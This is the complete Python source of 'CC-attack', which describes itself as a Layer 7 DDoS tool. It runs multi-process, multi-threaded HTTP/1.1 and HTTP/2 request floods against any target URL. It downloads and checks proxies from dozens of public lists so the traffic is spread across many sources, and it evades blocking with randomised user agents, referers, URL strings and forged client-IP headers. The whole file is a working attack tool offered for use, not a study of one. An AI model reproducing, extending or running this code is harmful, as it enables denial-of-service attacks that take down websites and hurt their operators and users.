# CC-attack rewrite preview version
# Coded by Leeon123
#############################
# Import built-in libraries #
#############################
import threading
import multiprocessing
import concurrent.futures
import random
import ssl
import sys
import string
import socket
import os
import time
import requests
import h2.connection
import h2.events

try:
	import win32file# I guess linux won't have this library, doesn't it?
	win32file._setmaxstdio(8192)# It's somehow equal to 'ulimit -n 8192' in linux but it's for windows
	#print("Set")
except:
	pass

try:
	import socks
except:
	print("Please install pysocks from pip.")
	exit(126)

#############################
#         variables         #
#############################
class global_vars :

	def __init__(self) -> None:
		self.http2 = False
		self.method = "get"
		self.target_url = ""
		self.proxy_type = 5
		self.threads_num = 400
		self.process_num = 1
		self.payload = ""
		self.cookies = ""
		self.cookies_file = ""
		self.randurl = False
		self.path = "/"
		self.timeout = 5

		self.proxies_list = []
		self.protocol = ""
		self.target = ""
		self.port = 0

		self.acceptall =  [
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
			"Accept-Encoding: gzip, deflate\r\n",
			"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
			"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
			"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
			"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
			"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
			"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n,"
			"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
			"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
			"Accept: text/html, application/xhtml+xml",
			"Accept-Language: en-US,en;q=0.5\r\n",
			"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
			"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
			]

		self.referers = [
			"https://www.google.com/search?q=",
			"https://check-host.net/",
			"https://www.facebook.com/",
			"https://www.youtube.com/",
			"https://www.fbi.com/",
			"https://www.bing.com/search?q=",
			"https://r.search.yahoo.com/",
			"https://www.cia.gov/index.html",
			"https://vk.com/profile.php?redirect=",
			"https://www.usatoday.com/search/results?q=",
			"https://help.baidu.com/searchResult?keywords=",
			"https://steamcommunity.com/market/search?q=",
			"https://www.ted.com/search?q=",
			"https://play.google.com/store/search?q=",
			"https://www.qwant.com/search?q=",
			"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
			"https://www.google.ad/search?q=",
			"https://www.google.ae/search?q=",
			"https://www.google.com.af/search?q=",
			"https://www.google.com.ag/search?q=",
			"https://www.google.com.ai/search?q=",
			"https://www.google.al/search?q=",
			"https://www.google.am/search?q=",
			"https://www.google.co.ao/search?q=",
			]

		self.proxytype_mapping ={
			5: socks.SOCKS5,
			4: socks.SOCKS4,
			0: socks.HTTP,
		}



#################################
#          Misc stuff          #
#################################

def PrintLogo():
	print ('''
	   /////    /////    /////////////
	  CCCCC/   CCCCC/   | CC-attack |/
	 CC/      CC/       |-----------|/ 
	 CC/      CC/       |  Layer 7  |/ 
	 CC/////  CC/////   | ddos tool |/ 
	  CCCCC/   CCCCC/   |___________|/
>--------------------------------------------->
Version: Preview
.                             C0d3d by L330n123
┌─────────────────────────────────────────────┐
│        Tos: Don't attack .gov website       │
├─────────────────────────────────────────────┤
│                 New stuff:                  │
│          [+]     Rewrote                    │
├─────────────────────────────────────────────┤
│ Link: https://github.com/Leeon123/CC-attack │
└─────────────────────────────────────────────┘''')


def getuseragent():
	# Define the possible components of a user agent string
	browser_names = ["Chrome", "Safari", "Firefox", "Edge"]
	operating_systems = ["Windows", "Mac OS X", "Linux"]

	# Generate a random user agent
	browser_name = random.choice(browser_names)
	operating_system = random.choice(operating_systems)
	user_agent = f"Mozilla/5.0 ({operating_system} {random.randint(1, 10)}.0; {random.choice(['Win64', 'x64'])}) AppleWebKit/537.36 (KHTML, like Gecko) {browser_name}/{random.randint(50, 99)}.0.{random.randint(1000, 9999)} Safari/537.36"
	return user_agent

def RandomString():
	pattern = random.randint(0,3)
	if pattern == 0:
		return generate_random_string("s"*10+"d"*10+"S"*10)
	if pattern == 1:
		return generate_random_string("S"*5+"s"*5+"S"*5+"d"*15)
	if pattern == 2:
		return generate_random_string("d"*5+"s"*10+"S"*10+"d"*5)
	if pattern == 3:
		return generate_random_string("d"*20+"s"*5+"S"*5)

def generate_random_string(pattern):
	# Generate a random string of the specified pattern
	random_string = ""
	for ch in pattern:
		if ch == "s":
			# Generate a random lowercase letter
			random_string += random.choice(string.ascii_letters[:26])
		elif ch == "S":
			# Generate a random uppercase letter
			random_string += random.choice(string.ascii_letters[26:])
		elif ch == "d":
			# Generate a random digit
			random_string += random.choice(string.digits)
		else:
			# Use the character as-is
			random_string += ch
	return random_string

def build_threads(vars,events):
	# Create a thread to run the HTTP flood function
	for _ in range(vars.threads_num):
		if vars.http2:
			threading.Thread(target=CC_ATTACK2, args=(vars,events,)).start()
		else:
			threading.Thread(target=CC_ATTACK, args=(vars,events,)).start()

def build_processes(vars,events):
	if vars.process_num < 1:
		print("Invaild Process numbers.(At least 1 process)")
	for _ in range(vars.process_num):
		#build_threads(vars,events)
		multiprocessing.Process(target=build_threads, args=(vars,events,),daemon=True).start()

def check_list(proxy_file):
	seen = set()
	with open(proxy_file, "r") as f:
		s = socks.socksocket()
		for line in f:
			if ':' in line and '#' not in line:
				try:
					proxy = line.strip().split(":")
					s.set_proxy(socks.HTTP,str(proxy[0]),int(proxy[1]))
					if line not in seen:
						seen.add(line)
				except:
					pass
	with open(proxy_file,"w") as f:
		for line in seen:
			f.write(line)

def GenFakeIp():
	return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def PreGenRequest(vars):
	path_parts = vars.path.partition("?")
	add = "&" if path_parts[1] else "?"
	request =  vars.method.upper() + " " + vars.path + "{url_arg}  HTTP/1.1\r\n".format(url_arg=add+"{url_arg}" if vars.randurl else "")
	request += "Host: "+vars.target+":"+str(vars.port)+"\r\n"
	request += "User-Agent: " + getuseragent() + "\r\n"

	if vars.cookies != "":
		request += "Cookies: "+vars.cookies+"\r\n"

	request += random.choice(vars.acceptall)
	request += "Connection: Keep-Alive\r\n"
	request += "Cache-Control: no-cache\r\n"
	request += "Upgrade-Insecure-Requests: 1\r\n"
	request += "Sec-Fetch-Dest: document\r\n"
	request += "Sec-Fetch-Mode: navigate\r\n"
	request += "Sec-Fetch-Site: none\r\n"
	request += "Sec-Fetch-User: ?1\r\n"

	fakeip = GenFakeIp()
	request += "Via: " + fakeip + "\r\n"
	request += "Client:" + fakeip + "\r\n"
	request += "Client-IP:" + fakeip + "\r\n"
	request += "X-Forwarded-For:" + fakeip + "\r\n"
	request += "X-Forwarded-Proto: http\r\n"

	if vars.method != "post":
		request += "Referer: "+random.choice(vars.referers)+vars.target+"\r\n"
		request+= "\r\n"
	else:
		request += "Referer: "+vars.protocol+"://"+vars.target+"\r\n"
		request += "Content-Type: text/html; charset=utf-8\r\n"
		request += "Content-Legnth: {payload_len}\r\n"
		request += "\r\n{payload}"

	return request


def PreGenRequest2(vars):
	path_parts = vars.path.partition("?")
	add = "&" if path_parts[1] else "?"
	request = {
		":scheme":"https",
		":method" : vars.method.upper(),
		":authority": vars.target,
		":path": vars.path + "{url_arg}".format(url_arg=add+"{url_arg}" if vars.randurl else ""),
		"user-agent": getuseragent(),
	}
	
	if vars.cookies != "":
		request["cookie"]=vars.cookies

	accept_ln = random.choice(vars.acceptall).split("\r\n")
	for accept in accept_ln:
		try:
			accept = accept.strip().split(":")
			request[accept[0]]= accept[1]
		except:
			pass

	request["connection"]="keep-alive"
	request["cache-control"]="no-cache"
	request["sec-fetch-dest"]="document"
	request["sec-fetch-mode"]="navigate"
	request["sec-fetch-site"]="none"
	request["sec-fetch-user"]="?1"

	fakeip = GenFakeIp()
	request["via"]=fakeip
	request["client"]=fakeip
	request["client-ip"]=fakeip
	request["x-forwarded-for"]=fakeip
	request["x-forwarded-proto"]="http"

	if vars.method != "post":
		request["referer"]=random.choice(vars.referers)+vars.target
	else:
		request["referer"]=vars.protocol+"://"+vars.target
		request["content-type"]="text/html; charset=utf-8"
		request["content-length"]="{payload_len}"
		#request += "{payload}"

	return request

def PrintHelp():
	print('''
┌─────────────┬───── CC-attack help list  ───────────────────┐
│   -h/help   │ showing this message                         │
│   -url      │ set target url                               │
│   -m/method │ set HTTP Method(GET/POST/HEAD, default:GET)  │
│   -data     │ set post data path                           │
│             │ (Example: -data data.txt)                    │
│   -cookies  │ set cookies (Example: 'id:xxx;ua:xxx')       │
│   -v        │ set proxy type (4/5/http, default:5)         │
│   -f        │ set proxies file (default:proxy.txt)         │
│   -s        │ set attack time(default:60)                  │
│   -tt       │ set threads number per process (default:400) │
│   -tp       │ set process number (default:1)               │
│   -timeout  │ set timeout (default:5)                      │
│   -rand     │ enable random url/post data                  │
│   -down     │ download proxies                             │
│   -check    │ check proxies                                │
│   -old      │ enable old interface                         │
│   -h2       │ enable http2 protocol                        │ 
└─────────────┴──────────────────────────────────────────────┘''')

#################################
#         Proxy stuff           #
#################################
def download_proxies_as_list(api):
	tmp = b''
	try:
		tmp = requests.get(api, timeout=5,headers={"user-agent":getuseragent()}).content
	except ConnectionError:
		# Retry request after a short delay
		time.sleep(0.5)
		tmp = requests.get(api, timeout=5,headers={"user-agent":getuseragent()}).content
	except:
		pass
	return tmp

def download_proxies(vars, out_file):
	api_list = set()
	if vars.proxy_type == 4:
		api_list = [
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
			"https://openproxylist.xyz/socks4.txt",
			"https://proxyspace.pro/socks4.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
			"https://www.proxy-list.download/api/v1/get?type=socks4",
			"https://www.proxyscan.io/download?type=socks4",
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
			"https://api.openproxylist.xyz/socks4.txt",]
	elif vars.proxy_type == 5:
		api_list = [
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
			"https://www.proxy-list.download/api/v1/get?type=socks5",
			"https://www.proxyscan.io/download?type=socks5",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
			"https://api.openproxylist.xyz/socks5.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
			"https://openproxylist.xyz/socks5.txt",
			"https://proxyspace.pro/socks5.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",]
	elif vars.proxy_type == 0:
		api_list = [
			"https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
			"https://www.proxy-list.download/api/v1/get?type=http",
			"https://www.proxyscan.io/download?type=http",
			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
			"https://api.openproxylist.xyz/http.txt",
			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
			"http://alexa.lr2b.com/proxylist.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
			"https://proxy-spider.com/api/proxies.example.txt",
			"https://multiproxy.org/txt_all/proxy.txt",
			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
			"https://openproxylist.xyz/http.txt",
			"https://proxyspace.pro/http.txt",
			"https://proxyspace.pro/https.txt",
			"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
			"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
			"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
			"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
			"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
			"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
			"https://rootjazz.com/proxies/proxies.txt",
			"https://sheesh.rip/http.txt",
			"https://www.proxy-list.download/api/v1/get?type=https"]
	with open(out_file, "wb") as f:
		with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:#Ultra fast proxies downloader, LOL
			task_list = {executor.submit(download_proxies_as_list,api): api for api in api_list}
			for task in concurrent.futures.as_completed(task_list):
				data = task.result()
				f.write(data)
	if vars.proxy_type == 4:
		socks_proxy_net(out_file)
	check_list(out_file)
	print("> Have already downloaded proxies list as "+out_file)

def socks_proxy_net(out_file):
	try:
		r = requests.get("https://www.socks-proxy.net/",timeout=5,headers={"user-agent":getuseragent()})
		part = str(r.content)
		part = part.split("<tbody>")
		part = part[1].split("</tbody>")
		part = part[0].split("<tr><td>")
		proxies = ""
		for proxy in part:
			proxy = proxy.split("</td><td>")
			try:
				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
			except:
				pass
			fd = open(out_file,"a")
			fd.write(proxies)
			fd.close()
	except:
		pass

def ProxiesChecker(input_list,proxy_type,target_url,timeout):
	proxy_type_dict = {
		0: "http://",
		4: "socks4://",
		5: "socks5://",
	}
	if target_url == "":
		target_url = "http://www.example.com"
	good = set()
	with concurrent.futures.ThreadPoolExecutor(max_workers=800) as executor:#Super Fast Proxies Checker, LOL
		print("> Checking proxies' availability")
		task_list = {executor.submit(CheckingProxy,target_url,proxy_type_dict[proxy_type],proxy.strip(),timeout): proxy for proxy in input_list}
		for task in concurrent.futures.as_completed(task_list):
			try:
				result = task.result()
				#print(result) # debug
				if "error" not in str(result):
					if str(result) not in good:
						good.add(str(result))
			except:
				pass
	return good

def CheckingProxy(url,proxy_type,proxy,timeout):
	try:# Check the proxy is alive at first, it should be saved some time
		proxy_splited = proxy.split(":")
		s = socket.socket()
		s.settimeout(timeout)
		s.connect((proxy_splited[0],int(proxy_splited[1])))
		s.close()
	except:
		return "error 1"
	try:
		r = requests.get(url,proxies={'http': proxy_type+proxy ,'https':proxy_type+proxy},timeout=timeout,headers={"user-agent":getuseragent()})
		return proxy
	except requests.exceptions.Timeout:
		return "error 2"
	except:
		return proxy
		
	

#################################
#           CC-ATTACK           #
#################################
def CC_ATTACK(vars,event):
	# Split the proxy string into host and port
	proxy = random.choice(vars.proxies_list).strip().split(":")

	ctx = ssl.create_default_context()
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE

	# Generate the request
	pre_request= PreGenRequest(vars)
	request = pre_request

	# Wait signal
	event.wait()

	# Keep sending requests until interrupted
	
	while True:
		try:
			# Create a socket and set the proxy and timeout
			s = socks.socksocket()
			s.set_proxy(vars.proxytype_mapping[vars.proxy_type], str(proxy[0]), int(proxy[1]))
			s.settimeout(vars.timeout)
			# Connect to the target
			s.connect((vars.target, vars.port))

			# If using HTTPS, wrap the socket in an SSL context
			if vars.protocol == "https":
				s = ctx.wrap_socket(s)

			# Send 64 requests
			for _ in range(64):
				# Use a random URL if specified
				if vars.randurl:
					request = pre_request.format(url_arg=RandomString())

				# Use a random payload if specified
				if vars.method == "post":
					if vars.payload != "":
						request = pre_request.format(payload=vars.payload,payload_len=len(vars.payload))
					else:
						data = RandomString()
						request = pre_request.format(payload=data,payload_len=len(str(data)))

				# Debug
				# print(request)

				# Send the request
				s.sendall(str.encode(request))
				s.settimeout(2)
			# Close the socket (maybe not close will get better result?)
			# Not closing the socket immediately
			# because usually the data are not totally sent to target yet
			#s.shutdown(2)
			#s.close()
		except:
			# Generate again, same as the initial action
			proxy = random.choice(vars.proxies_list).strip().split(":")
			request= PreGenRequest(vars)
			# Ignore any errors and keep sending requests
			pass

#http2
def CC_ATTACK2(vars,event):
	# Split the proxy string into host and port
	proxy = random.choice(vars.proxies_list).strip().split(":")

	ctx = ssl.create_default_context()
	ctx.set_alpn_protocols(['h2'])
	ctx.check_hostname = False
	ctx.verify_mode = ssl.CERT_NONE

	# Generate the request
	pre_request= PreGenRequest2(vars)
	requests = pre_request

	# Wait signal
	event.wait()

	# Keep sending requests until interrupted
	payload = vars.payload
	if payload == "":
		payload = RandomString()
	while True:
		try:
			# Create a socket and set the proxy and timeout
			s = socks.socksocket()
			s.set_proxy(vars.proxytype_mapping[vars.proxy_type], str(proxy[0]), int(proxy[1]))
			s.settimeout(vars.timeout)
			# Connect to the target
			s.connect((vars.target, vars.port))
			if vars.protocol == "https":
				s = ctx.wrap_socket(s)

			c = h2.connection.H2Connection()
			c.initiate_connection()
			s.sendall(c.data_to_send())
			# keep sending til error
			while 1:
				try:
					if vars.randurl:
						requests[":path"] = pre_request[":path"].format(url_arg=RandomString())
					if vars.method == "post":
						if vars.payload != "":
							requests["content-length"] = pre_request["content-length"].format(payload_len=len(vars.payload))
						else:				
							requests["content-length"] = pre_request["content-length"].format(payload_len=len(str(payload)))
					request = list(requests.items())
					id = c.get_next_available_stream_id()
					c.send_headers(id,headers=request,end_stream=False)
					s.sendall(c.data_to_send())
					s.settimeout(2)
					if vars.method == "post":
						c.send_data(id,payload,end_stream=False)
						s.sendall(c.data_to_send())
				except:
					break
			# Flooding no need to close socket :)
			#c.close_connection()
			#s.sendall(c.data_to_send())
			#s.close()

			# Close the socket (maybe not close will get better result?)
			# Not closing the socket immediately
			# because usually the data are not totally sent to target yet
			#s.shutdown(2)
			#s.close()
		except:
			# Generate again, same as the initial action
			proxy = random.choice(vars.proxies_list).strip().split(":")
			pre_request= PreGenRequest2(vars)
			# Ignore any errors and keep sending requests
			pass

#################################
#      Process Input stuff      #     
#################################

def InputOption(question, options, default):
	# Ask the user for an input until a valid response is given
	while True:
		# Get the user's response and strip leading/trailing white space
		ans = input(question).strip().lower()

		# If the user didn't enter a response, use the default value
		if not ans:
			ans = default

		# If the user's response is in the list of valid options, return it
		if ans in options:
			return ans

		# Otherwise, print an error message and loop again
		print("> Please enter the correct option")


def ParseUrl(original_url,vars):
	# Strip leading/trailing white space from the original URL
	original_url = original_url.strip()
	# Save it
	vars.target_url = original_url
	# Parse the protocol (default to "http")
	protocol = "http"
	if original_url.startswith("https://"):
		protocol = "https"

	# Split the URL into target, port, and path
	url = original_url.split("://")[1]
	target, *port_and_path = url.split("/")
	port = port_and_path[0].split(":")[1] if len(port_and_path) != 0 and ":" in port_and_path[0] else 443 if protocol == "https" else 80
	path = "/" + "/".join(port_and_path) if port_and_path else "/"

	# set the parsed components of the URL
	vars.protocol = protocol
	vars.target = target
	vars.port =  port
	vars.path = path

	# It should need to be return...
	# but i don't know what it works 
	# even I didn't return it in the first version...
	return vars


#################################
#         Input stuff          #
#################################
#haven't done, lazy to do it
def oldcli(vars):
	print("> Method: [get/post/head]")#/slow/check]") #haven't finished
	vars.method = InputOption("> Choose Your Method (default=get) :",["get","post","head"],"get")#,"slow","check"],"cc")
	url = str(input("> Input the target url:")).strip()
	ParseUrl(url,vars)
	if vars.method == "post":
		if InputOption("> Customize post data? (y/n, default=n):",["y","n","yes","no"],"n") == "y":
			data = open(input("> Input the file's path:").strip()).readlines()
			vars.payload = ' '.join([str(txt) for txt in data])
	if InputOption("> Customize cookies? (y/n, default=n):",["y","n","yes","no"],"n") == "y":
		vars.cookies = str(input("> Plese input the cookies:")).strip()

	ver = InputOption("> Choose your proxy type(4/5/http, default=5):",["4","5","http"],"5")
	if ver == "4":
		vars.proxy_type = 4
	elif ver == "5":
		vars.proxy_type = 5
	elif ver == "http":
		vars.proxy_type = 0

	tmp = InputOption("> Do you need to download proxies? (y/n, default=y):",["y","n"],"y")
	proxy_file = str(input("> Proxies file name (default=proxy.txt):"))
	if proxy_file == "":
		proxy_file = "proxy.txt"
	if tmp == "y":
		print("> Started downloading proxies...")
		download_proxies(vars,proxy_file)
		print("> Proxies Downloaded")

	if os.path.exists(proxy_file)!=True:
		print("Proxies file not found")
		return

	vars.proxies_list = open(proxy_file).readlines()
	tmp = InputOption("> Do you need to check the proxiesd? (y/n):",["y","n"],"y")
	if tmp == "y":
		vars.proxies_list = list(ProxiesChecker(vars.proxies_list,vars.proxy_type,vars.target_url,vars.timeout))
		with open(proxy_file, "w") as f:
			for line in vars.proxies_list:
				f.write(line+"\r\n")
		# Double check
		check_list(proxy_file)
		vars.proxies_list = open(proxy_file).readlines()

	if len(vars.proxies_list) == 0:
		print("> There are no more proxies. Please download a new proxies list.")
		return
	print ("> Number Of Proxies: %d" %(len(vars.proxies_list)))
	try:
		durations = int(input("> Durations of attacking ( 0 for no time limit ):"))
	except:
		print("> Durations of attacking should be a integer")
		return
	
	tmp = str(input("> Number of process (default=1):"))
	if tmp != "":
		try:
			vars.process_num = int(tmp)
		except:
			print("[!] Number of process should be an integer")
			exit(2)

	tmp = str(input("> Number of threads (default=400):"))
	if tmp != "":
		try:
			vars.threads_num = int(tmp)
		except:
			print("[!] Number of thread should be an integer")
			exit(2)

	event = multiprocessing.Event()
	print("> Building Process...")
	build_processes(vars,event)
	event.clear()
	input("Press Enter to continue.")
	event.set()
	print("> Flooding...")
	if durations > 0:
		time.sleep(durations)
	else:
		while True:
			try:
				time.sleep(0.5)
			except KeyboardInterrupt:
				break

def main():
	#Initial those "global" varibles
	vars = global_vars()
	help = False
	download = False
	check_proxies = False
	durations = 60
	proxy_file = "proxy.txt"
	for n,args in enumerate(sys.argv):
		if args == "-old":
			oldcli(vars)
			return
		if args == "-help" or args =="-h":
			help =True
		if args=="-url":
			vars = ParseUrl(sys.argv[n+1],vars)
		if args=="-m" or args=="-method":
			vars.method = sys.argv[n+1]
			if vars.method not in ["get","post","head"]:#,"slow"]:
				print("> -m/-method argument error")
				return
		if args =="-v":
			ver= sys.argv[n+1]
			if ver == "4":
				vars.proxy_type = 4
			elif ver == "5":
				vars.proxy_type = 5
			elif ver == "http":
				vars.proxy_type = 0
			elif ver not in ["4","5","http"]:
				print("> -v argument error (only 4/5/http)")
				return
		if args == "-tt":
			try:
				vars.threads_num = int(sys.argv[n+1])
			except:
				print("> -tt must be positive integer")
				return
		if args == "-tp":
			try:
				vars.process_num = int(sys.argv[n+1])
			except:
				print("> -tp must be positive integer")
				return
		if args == "-cookies":
			vars.cookies = sys.argv[n+1]
		if args == "-data":
			data = open(sys.argv[n+1],"r",encoding="utf-8", errors='ignore').readlines()
			vars.payload = ' '.join([str(txt) for txt in data])
		if args == "-f":
			proxy_file = sys.argv[n+1]
		if args == "-rand":
			vars.randurl = True
		if args == "-down":
			download=True
		if args == "-check":
			check_proxies = True
		if args == "-s":
			try:
				durations = int(sys.argv[n+1])
			except:
				print("> -s must be integer")
				return
		if args == "-timeout":
			try:
				vars.timeout = int(sys.argv[n+1])
			except:
				print("> Timeout should be positive number")
				return
		if args == "-h2":
			vars.http2 = True

	if help or ( vars.target == "" and (download == False and check_proxies == False)):
		PrintHelp()
		return

	if download:
		print("> Started downloading proxies...")
		download_proxies(vars,proxy_file)
		print("> Proxies Downloaded")

	if os.path.exists(proxy_file)!=True:
		print("Proxies file not found")
		return

	vars.proxies_list = open(proxy_file).readlines()
	
	if check_proxies:
		vars.proxies_list = list(ProxiesChecker(vars.proxies_list,vars.proxy_type,vars.target_url,vars.timeout))
		with open(proxy_file, "w") as f:
			for line in vars.proxies_list:
				f.write(line+"\r\n")
		# Double check
		check_list(proxy_file)
		vars.proxies_list = open(proxy_file).readlines()	
	
	if len(vars.proxies_list) == 0:
		print("> There are no more proxies. Please download a new proxies list.")
		return
	print ("> Number Of Proxies: %d" %(len(vars.proxies_list)))
	
	if vars.target == "" or vars.target_url == "":
		print("> There is no target. End of process ")
		return
	'''
	if Method == "slow":
		th = threading.Thread(target=slow,args=(thread_num,proxy_type,))
		th.daemon = True
		th.start()
	else:'''
	event = multiprocessing.Event()
	print("> Building Process...")
	build_processes(vars,event)
	event.clear()
	#input("Press Enter to continue.")
	event.set()
	print("> Flooding...")
	time.sleep(durations)


if __name__ == '__main__':
	PrintLogo()
	main()
